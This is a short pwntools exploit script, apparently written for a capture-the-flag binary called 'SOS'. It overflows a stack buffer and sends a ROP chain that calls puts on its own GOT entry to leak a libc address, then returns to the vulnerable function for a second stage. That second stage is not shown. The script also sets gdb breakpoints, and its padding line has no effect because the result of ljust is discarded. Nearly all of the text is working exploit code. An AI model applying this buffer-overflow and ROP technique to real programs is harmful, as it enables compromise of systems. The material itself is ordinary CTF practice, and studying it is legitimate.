from pwn import *
elf = ELF("./SOS")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
io = process("./SOS")
#io = gdb.debug("./SOS","b *0x400bae\nc")

payload = 'a'*0x38
payload += p64(0x400c53)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(0x400afc)
payload.ljust(0x3000,'\x00')

io.recvuntil("size: \n")
io.sendline("0")
io.recvuntil("code: \n")
gdb.attach(io,"b *0x400bae")
raw_input()
io.send(payload)
raw_input()
io.interactive()

################CTMD! WTF about debugging
